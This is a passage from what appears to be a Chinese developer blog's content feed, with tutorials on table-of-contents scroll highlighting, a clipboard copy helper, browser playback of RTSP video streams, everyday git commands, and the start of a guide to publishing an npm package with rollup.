<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="title function_">from</span>(tocList, <span class="function">(<span class="params">v</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">`#toc #<span class="subst">$&#123;v.id&#125;</span>`</span>)</span><br><span class="line">  <span class="keyword">const</span> ele = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">`.container #<span class="subst">$&#123;v.id&#125;</span>`</span>)</span><br><span class="line">  <span class="keyword">if</span> (!btn || !ele) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(&#123; <span class="attr">top</span>: ele.<span class="property">offsetTop</span> - <span class="number">80</span>, <span class="attr">behavior</span>: <span class="string">&#x27;smooth&#x27;</span> &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h1>监听滚动时目录高亮节点</h1>
<p>这里不适用 scolll 来监听滚动，我这里用 <strong>observe</strong> 来监听</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">visibleChnage</span> = (<span class="params">obs</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">var</span> sider = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.siderbar&#x27;</span>)</span><br><span class="line">  <span class="keyword">var</span> toc = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#toc .li a&#x27;</span>)</span><br><span class="line">  item.<span class="title function_">forEach</span>(<span class="function">(<span class="params">observe</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 找到对应的节点</span></span><br><span class="line">    <span class="keyword">const</span> id = observe.<span class="property">target</span>.<span class="title function_">getAttribute</span>(<span class="string">&#x27;id&#x27;</span>),</span><br><span class="line">      anchor = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">`#toc .li #<span class="subst">$&#123;id&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!anchor) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果节点出现在可视视窗</span></span><br><span class="line">    <span class="keyword">if</span> (observe.<span class="property">isIntersecting</span>) &#123;</span><br><span class="line">      <span class="comment">// 排他（这个为了清除所有a标签中的类名 li-active）</span></span><br><span class="line">      <span class="title function_">removeClass</span>()</span><br><span class="line">      <span class="comment">// 目录 a 标签的类名为 li-active 时高亮</span></span><br><span class="line">      anchor.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;li-active&#x27;</span>)</span><br><span class="line">      <span class="keyword">const</span> index = <span class="title class_">Array</span>.<span class="title function_">from</span>(toc, <span class="function">(<span class="params">v</span>) =&gt;</span> v.<span class="title function_">getAttribute</span>(<span class="string">&#x27;id&#x27;</span>)).<span class="title function_">indexOf</span>(id)</span><br><span class="line">      <span class="comment">// 左边高亮目录条</span></span><br><span class="line">      sider.<span class="property">style</span>.<span class="property">transform</span> = <span class="string">`translateY(<span class="subst">$&#123;index * <span class="number">30</span>&#125;</span>px)`</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">IntersectionObserver</span>(visibleChnage)</span><br><span class="line"><span class="comment">// 监听滚动</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="title function_">from</span>(tocList).<span class="title function_">map</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> observer.<span class="title function_">observe</span>(item))</span><br></pre></td></tr></table></figure>
<p>排他: <strong>removeClass()</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 移除所有的 li-active 排他</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">removeClass</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> list = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#toc .li a&#x27;</span>)</span><br><span class="line">  <span class="title class_">Array</span>.<span class="title function_">from</span>(list, <span class="function">(<span class="params">v</span>) =&gt;</span> v.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;li-active&#x27;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>最终效果</h1>
<p><img src="https://img-blog.csdnimg.cn/d3aa71ceab7149c2b7a56b032a45f33c.png" alt="在这里插入图片描述"></p>
<p><a href="https://toc.4everland.app/">线上 demo1</a><br>
<a href="https://toc-five.vercel.app/">线上 demo2</a></p>
<p><a href="https://gitee.com/xie392/toc">Gitee 地址</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>js复制兼容写法封装</title>
    <url>/JavaScript/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A4%8D%E5%88%B6%E5%85%BC%E5%AE%B9%E5%86%99%E6%B3%95/</url>
    <content><![CDATA[<p>Clipboard 接口实现了 Clipboard API，如果用户授予了相应的权限，其就能提供系统剪贴板的读写访问能力。在 Web 应用程序中，Clipboard API 可用于实现剪切、复制和粘贴功能。</p>
<hr>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Clipboard</span> = (<span class="params">text</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (navigator.<span class="property">clipboard</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 复制成功</span></span><br><span class="line">      navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(text)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="comment">// 复制失败</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> textArea = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;textarea&#x27;</span>)</span><br><span class="line">    textArea.<span class="property">value</span> = text</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(textArea)</span><br><span class="line">    textArea.<span class="title function_">focus</span>()</span><br><span class="line">    textArea.<span class="title function_">select</span>()</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 复制成功</span></span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="comment">// 复失败</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(textArea)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>网页播放rtsp视频流</title>
    <url>/JavaScript/%E7%BD%91%E9%A1%B5%E6%92%AD%E6%94%BErtsp%E8%A7%86%E9%A2%91%E6%B5%81/</url>
    <content><![CDATA[<h1>前言</h1>
<p>目前我所用过的四种方法可以实现网页播放 rtsp 视频流，在各大浏览器做了测试，基本都能显示。以下这些都可以在各大主流浏览器上播放，但我并没有深入了解，全是一些 demo，所以此文仅供参考</p>
<hr>
<h1>方法</h1>
<p>目前这四种方法几乎都是流码实现网页播放功能,话不多说，如下：</p>
<ul>
<li>RTSPtoWebRTC</li>
<li>VLC</li>
<li>ffmpeg+jsmpeg+node</li>
<li>rtsp 转 m3u8</li>
</ul>
<h1>一、RTSPtoWebRTC</h1>
<p>安装 go 环境（<a href="https://golang.google.cn/dl/">下载地址</a>）。建议默认安装，如果没默认可能要配置环境变量。下载安装后查看是否全局使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go version</span><br></pre></td></tr></table></figure>
<p>有相关信息就证明安装成功。一般 go 需要换源，国内速度太慢，或者说根本访问不了，建议换源（下面命令）</p>
<p>1、开启 Go 的 MODULE 支持：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export GO111MODULE=on</span><br></pre></td></tr></table></figure>
<p>2、软件源替换：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>
<p>装好 Go 所需的环境变量后，下载 <a href="https://gitee.com/miao_guoguo/RTSPtoWebRTC">RTSPtoWebRTC</a> ，下载完成后，修改 <strong>confing.json</strong> 中的 url 就行</p>
<p><img src="https://img-blog.csdnimg.cn/9c39887699cc4944b98e8fd1ff86f7a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWElFMzky,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<p>运行命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GO111MODULE=on go run *.go Windowsmo</span><br></pre></td></tr></table></figure>
<p>如果是在 cmd 运行命令会报错，因为 Windows 下不支持。改为 Git.bash 运行就可以了， 如果没有 Git, 可以点击 <a href="https://git-scm.com/downloads">下载</a>，我相信大多会有的，毕竟是常用。测试运行是否成功，网页打开链接(如果你端口没改的话)：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//localhost:8083</span></span><br></pre></td></tr></table></figure>
<p>打开后会看到视频播放，如果没成功请去其它博文看一下怎么使用吧，本人是成功显示的，这个还算比较简单的 demo</p>
<h1>二、VLC</h1>
<p>下载 VLC，建议用 32 位的，64 位没成功过，点击 <a href="https://www.videolan.org/">下载</a>，下载完成后打开 【媒体】—【打开网络串流】，输入 rtsp 地址后，选择播放旁边那个小箭头【串流】–【下一个】，把文件选项改为 http 后再点击【添加】，输入一个你记得住的地址，如：video,端口号默认即可。填完后点击【下一个】，勾选【激活转码】，把配置文件改为【Video - Theora + Vorbis（OGG）】—【下一个】，勾选【串流所有基本流】—【流】，这样就可以了，看不懂的可以百度以下这个，毕竟这个有很多的图文教程，这里我就懒得传图了。如果想看图文教程的推荐看这篇 <a href="https://blog.csdn.net/pxxian/article/details/105988250">文章</a>。经过测试，ie 写法如下(其它浏览器不支持这种写法)：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span></span></span><br><span class="line"><span class="tag">  <span class="attr">type</span>=<span class="string">&quot;application/x-vlc-plugin&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;vlc&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">events</span>=<span class="string">&quot;True&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">width</span>=<span class="string">&quot;720&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">height</span>=<span class="string">&quot;540&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">pluginspage</span>=<span class="string">&quot;http://www.videolan.org&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">codebase</span>=<span class="string">&quot;http://downloads.videolan.org/pub/videolan/vlc-webplugins/2.0.6/npapi-vlc-2.0.6.tar.xz&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param</span></span></span><br><span class="line"><span class="tag">    <span class="attr">name</span>=<span class="string">&quot;mrl&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">value</span>=<span class="string">&quot;http://localhost:8080/video&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param</span></span></span><br><span class="line"><span class="tag">    <span class="attr">name</span>=<span class="string">&quot;volume&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">value</span>=<span class="string">&quot;50&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param</span></span></span><br><span class="line"><span class="tag">    <span class="attr">name</span>=<span class="string">&quot;autoplay&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">value</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param</span></span></span><br><span class="line"><span class="tag">    <span class="attr">name</span>=<span class="string">&quot;loop&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">value</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param</span></span></span><br><span class="line"><span class="tag">    <span class="attr">name</span>=<span class="string">&quot;fullscreen&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">value</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其它浏览器正常写法</p>
<h1>三、ffmpeg+jsmpeg+node</h1>
<p>第一步是先安装 ffmpeg，并设置环境变量（/bin 目录），点击 <a href="https://github.com/phoboslab/jsmpeg">下载</a>，看设置环境变量是否成功(cmd)：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg</span><br></pre></td></tr></table></figure>
<p>有一大堆东西就证明成功了，接下来就是下载脚本 jsmpeg，点击 <a href="https://github.com/phoboslab/jsmpeg">下载</a>，下载完成之后打开安装依赖包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
<p>安装完成后依次安装 websocket 和 http-server ,依次输入如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install ws</span><br><span class="line">npm install http-server -g</span><br></pre></td></tr></table></figure>
<p>这里并不打算全局安装 websocket ，全局安装运行会报找不到该模块，所以这里选择安装在该目录下的依赖包中就行。接下来启动服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node websocket-relay.js supersecret 8081 8082</span><br></pre></td></tr></table></figure>
<ul>
<li>supersecret 是密码</li>
<li>8081 是 ffmpeg 推送端口</li>
<li>8082 是前端 webSocket 端口</li>
</ul>
<p>运行后在开一个新窗口，输入:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -I &quot;rtsp地址&quot; -q 0 -f mpegts -codec:v mpeg1video -s 1366x768 http://127.0.0.1:8081/supersecret</span><br></pre></td></tr></table></figure>
<p>最后启动项目</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http-server</span><br></pre></td></tr></table></figure>
<p>浏览器打开 demo</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//localhost:8080</span></span><br></pre></td></tr></table></figure>
<h1>四、rtsp 转 m3u8</h1>
<p>参考上面第三安装 ffmpeg 和 http-server，在你自己的 demo 中创建一个叫 <strong>hls</strong> 的文件夹，运行（cmd):</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg  -i rtsp地址 -c copy -f hls F:\demo\his\test.m3u8  # 后面为 hls 的文件路径 + \name.m3u8</span><br></pre></td></tr></table></figure>
<p>使用 video.js 播放 m3u8 文件，头部引入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span></span></span><br><span class="line"><span class="tag">  <span class="attr">href</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/video.js/7.10.2/video-js.min.css&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/video.js/7.10.2/video.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">id</span>=<span class="string">&quot;my-player&quot;</span> <span class="attr">class</span>=<span class="string">&quot;video-js vjs-big-play-centered&quot;</span>  <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/hls/test.m3u8&quot;</span> <span class="attr">type</span>=<span class="string">&quot;application/x-mpegURL&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>script</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> player = <span class="title function_">videojs</span>(<span class="string">&#x27;myv&#x27;</span>)</span><br><span class="line">player.<span class="title function_">play</span>()</span><br></pre></td></tr></table></figure>
<h1>结尾</h1>
<p>目前我所能够实现网页播放 rtsp 的就这中方法，希望对你有所帮助</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>git在工作中的使用</title>
    <url>/Other/Git%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>这里简单介绍一下 git 的常用命令</p>
<hr>
<h1>1、克隆代码</h1>
<p>我们知道，第一次本地没有项目，所以需要先下载项目到本地。要下载别人的远程代码到本地，可以使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://...   # https://...为远程仓库地址</span><br></pre></td></tr></table></figure>
<p>基本使用一次之后，就不用每天克隆远程代码到本地了</p>
<h1>2、更新本地代码</h1>
<hr>
<h4 id="更新方法一">更新方法一</h4>
<p>后面不需要每天克隆代码，只需要获取最新的远程代码即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>
<h4 id="更新方法二">更新方法二</h4>
<p>在本地新建一个 new-master 分支，并将远程 origin 仓库的 master 分支代码下载到本地 new-master 分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git fetch origin master:new-master</span><br></pre></td></tr></table></figure>
<p>合并 new-master 分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git merge new-master</span><br></pre></td></tr></table></figure>
<p>最后可以删除分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -d new-master # -D 可以强制删除分支</span><br></pre></td></tr></table></figure>
<h1>3、推送代码到远程仓库</h1>
<p>第一天克隆代码本地后，修后需要上传到远程仓库，依次使用命令<br>
1、上传到本地仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure>
<p>2、提交备注</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;name&quot;  # name为备注信息</span><br></pre></td></tr></table></figure>
<p>3、推送到远程仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push https://...   # https://...为远程仓库地址</span><br></pre></td></tr></table></figure>
<p>可能第一次推送会有些问题</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">error:failed to push some refs to &#x27;https://...&quot;</span><br><span class="line">hint: Updates were rejected because the remote contains work that you do</span><br><span class="line">hint: not have locally. This is usually caused by another repository pushing</span><br><span class="line">hint: to the same ref. You may want to first integrate the remote changes</span><br><span class="line">hint: (e.g., ‘git pull …’) before pushing again.</span><br><span class="line">hint: See the ‘Note about fast-forwards’ in ‘git push --help’ for details.</span><br></pre></td></tr></table></figure>
<p>解决方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull origin master # master为远程分支名</span><br><span class="line">git push origin master # 推送到远程仓库</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
  </entry>
  <entry>
    <title>如何发布自己的 npm 包</title>
    <url>/Other/npm%E5%8F%91%E5%B8%83%E5%8C%85/</url>
    <content><![CDATA[<h1>一、创建账号</h1>
<p>在 <a href="https://www.npmjs.com">npm 官网</a> 注册并创建 npm 账号</p>
<h1>二、创建 npm 包</h1>
<p>创建并初始化 package.json 文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm init</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">yarn init</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">pnpm init</span><br></pre></td></tr></table></figure>
<p>大概结构如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;plugin-name&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>目录结构先这样就行，后面有需要再添加或修改</p>
<h1>三、编写代码</h1>
<p>按正常写代码那样写就好，自己需要什么功能就写什么功能。例如在更目录下创建一个<code>index.js</code> 文件</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第一个插件！&quot;</span>);</span><br></pre></td></tr></table></figure>
<h1>四、打包</h1>
<p>我们打包一下，这里使用 rollup 打包，当然你也可以使用 webpack 打包，或者其他的打包工具，这里不做过多介绍</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm i rollup -D</span><br></pre></td></tr></table></figure>
<p>在根目录下创建一个<code>rollup.config.js</code>文件，内容如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个Rollup插件，用于从node_modules里加载模块, 安装命令: pnpm i @rollup/plugin-node-resolve -D</span></span><br><span class="line"><span class="keyword">import</span> resolve <span class="keyword">from</span> <span class="string">&quot;@rollup/plugin-node-resolve&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个Rollup插件，用于将TypeScript转换为JavaScript, 安装命令: pnpm i rollup-plugin-typescript2 -D</span></span><br><span class="line"><span class="comment">// 这里没有使用 ts 所以注释掉了</span></span><br><span class="line"><span class="comment">// import &#123; terser &#125; from &quot;rollup-plugin-terser&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个Rollup插件，用于将TypeScript转换为JavaScript, 安装命令: pnpm i rollup-plugin-typescript2 -D</span></span><br><span class="line"><span class="comment">// 这里没有使用 ts 所以注释掉了</span></span><br><span class="line"><span class="comment">// import typescript from &quot;rollup-plugin-typescript2&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个Rollup插件，用于将CommonJS模块转换为ES6，以便将其包含在Rollup包中, 安装命令: pnpm i @rollup/plugin-commonjs -D</span></span><br><span class="line"><span class="comment">// 如果你的代码中使用了CommonJS模块，那么就需要使用这个插件，我这里不需要，所以注释掉了</span></span><br><span class="line"><span class="comment">// import commonjs from &quot;@rollup/plugin-commonjs&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个Rollup插件，用于从JSON文件中读取数据,  安装命令: pnpm i @rollup/plugin-json -D</span></span><br><span class="line"><span class="comment">// 如果你的代码中使用了JSON文件，那么就需要使用这个插件</span></span><br><span class="line"><span class="comment">// import json from &quot;@rollup/plugin-json&quot;;</span></span><br><span class="line"><span class="comment">// import pkg from &quot;./package.json&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> resolveFile = <span class="keyword">function</span> (<span class="params">filePath</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> path.<span class="title function_">join</span>(__dirname, filePath);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="comment">// 这里是打包入口文件</span></span><br><span class="line">  <span class="attr">input</span>: <span class="title function_">resolveFile</span>(<span class="string">&quot;index.js&quot;</span>),</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 打包出口文件</span></span><br><span class="line"><span class="comment">   * 这里看自己的需求添加</span></span><br><span class="line"><span class="comment">   * 可以只打包成 umd 模块，也可以打包成 umd 和 es module 模块</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">output</span>: [</span><br><span class="line">    <span class="comment">// 这里是打包成 es module 模块的配置, commonjs 模块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">file</span>: <span class="title function_">resolveFile</span>(<span class="string">&#x27;dist/index.js&#x27;</span>),</span><br><span class="line">      <span class="attr">format</span>: <span class="string">&quot;cjs&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 这里是打包成 umd 模块的配置 es module 模块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">file</span>: <span class="title function_">resolveFile</span>(<span class="string">&#x27;dist/index.esm.js&#x27;</span>),</span><br><span class="line">      <span class="attr">format</span>: <span class="string">&quot;es&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 这里是打包成 umd 模块的配置 umd 模块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">file</span>: <span class="title function_">resolveFile</span>(<span class="string">&#x27;dist/index.umd.js&#x27;</span>),</span><br><span class="line">      <span class="attr">format</span>: <span class="string">&quot;umd&quot;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;plugin-name&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">  <span class="comment">// 这里是要使用的插件,这里看自己的需求添加</span></span><br><span class="line">  <span class="attr">plugins</span>:&#123;</span><br><span class="line">    <span class="title function_">resolve</span>(),</span><br><span class="line">    <span class="comment">//   commonjs(),</span></span><br><span class="line">    <span class="title function_">json</span>(),</span><br><span class="line">    <span class="comment">//   typescript(&#123;</span></span><br><span class="line">    <span class="comment">//     tsconfig: resolveFile(&quot;tsconfig.json&quot;),</span></span><br><span class="line">    <span class="comment">//   &#125;),</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>然后在<code>package.json</code>文件中添加打包命令</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rollup -c&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>你也可以添加一些其他的,例如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;plugin-name&quot;</span><span class="punctuation">,</span> <span class="comment">// 包名</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span> <span class="comment">// 包版本号</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;代码块 Vue&quot;</span><span class="punctuation">,</span> <span class="comment">// 包描述</span></span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="comment">// 关键字, 用于搜索</span></span><br><span class="line">    <span class="string">&quot;codeblock&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;module&quot;</span><span class="punctuation">,</span> <span class="comment">// 包的类型，可以是 commonjs 或者 es module</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist/index.js&quot;</span><span class="punctuation">,</span> <span class="comment">// 默认入口文件</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 